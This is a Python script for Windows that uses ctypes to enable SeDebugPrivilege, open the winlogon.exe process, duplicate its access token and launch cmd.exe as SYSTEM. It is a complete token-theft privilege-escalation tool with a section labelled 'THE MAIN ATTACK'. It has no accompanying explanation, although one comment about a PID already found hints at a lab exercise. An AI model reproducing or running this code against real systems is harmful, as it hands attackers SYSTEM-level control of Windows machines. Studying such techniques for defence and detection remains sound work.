import sys
import ctypes
from ctypes import wintypes


# ==========================================
# 1. MANUALLY DEFINE MISSING STRUCTURES
# ==========================================
# This fixes the "AttributeError: module 'ctypes.wintypes' has no attribute 'LUID'"

class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", wintypes.DWORD),
        ("HighPart", wintypes.LONG),
    ]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", wintypes.DWORD),
    ]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 1),
    ]


# ==========================================
# 2. DEFINE WINDOWS API CONSTANTS
# ==========================================
kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

PROCESS_ALL_ACCESS = 0xFFFF
TOKEN_ALL_ACCESS = 0xF01FF
TokenPrimary = 1
SecurityImpersonation = 2

SE_DEBUG_NAME = 'SeDebugPrivilege'
SE_PRIVILEGE_ENABLED = 0x00000002


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


# ==========================================
# 3. HELPER FUNCTIONS
# ==========================================

def enable_privilege(privilege_name):
    h_token = wintypes.HANDLE()
    luid = LUID()  # NOW USING OUR MANUAL DEFINITION

    if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ALL_ACCESS, ctypes.byref(h_token)):
        print("[!] Failed to open current process token.")
        return False

    if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
        print("[!] Failed to lookup privilege.")
        return False

    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    if not advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), 0, None, None):
        print("[!] Failed to adjust token privilege.")
        return False

    print(f"[+] Privilege {privilege_name} ENABLED!")
    return True


# ==========================================
# 4. THE MAIN ATTACK
# ==========================================

def steal_token(pid):
    print(f"[*] Attempting to steal token from PID: {pid}")

    # 1. Open Target Process
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print(f"[!] Could not open process {pid}. Are you Admin?")
        return

    print(f"[+] Got handle to process: {h_process}")

    # 2. Open Target Token
    h_token = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(h_process, TOKEN_ALL_ACCESS, ctypes.byref(h_token)):
        print("[!] Could not open process token.")
        return

    print(f"[+] Got handle to token: {h_token}")

    # 3. Duplicate Token
    h_token_dup = wintypes.HANDLE()
    status = advapi32.DuplicateTokenEx(
        h_token,
        TOKEN_ALL_ACCESS,
        None,
        SecurityImpersonation,
        TokenPrimary,
        ctypes.byref(h_token_dup)
    )

    if not status:
        print(f"[!] Failed to duplicate token: {ctypes.GetLastError()}")
        return

    print(f"[+] Token duplicated successfully! Handle: {h_token_dup}")

    # 4. Spawn CMD with Stolen Token
    startup = STARTUPINFO()
    startup.cb = ctypes.sizeof(STARTUPINFO)
    process_info = PROCESS_INFORMATION()

    cmd_line = "C:\\Windows\\System32\\cmd.exe"

    print(f"[*] Spawning {cmd_line} with stolen token...")

    success = advapi32.CreateProcessWithTokenW(
        h_token_dup,
        0,
        cmd_line,
        None,
        0,
        None,
        None,
        ctypes.byref(startup),
        ctypes.byref(process_info)
    )

    if success:
        print("\n[+] SUCCESS! A new CMD window has spawned.")
        print("[+] This window is running as SYSTEM.")
    else:
        print(f"[!] Failed to create process: {ctypes.GetLastError()}")


if __name__ == '__main__':
    if enable_privilege(SE_DEBUG_NAME):
        # Remember to use the PID you found (592)
        target_pid = input("Enter the PID of 'winlogon.exe' (SYSTEM process): ")
        steal_token(target_pid)
    else:
        print("[!] Could not enable privileges. Run as Administrator.")
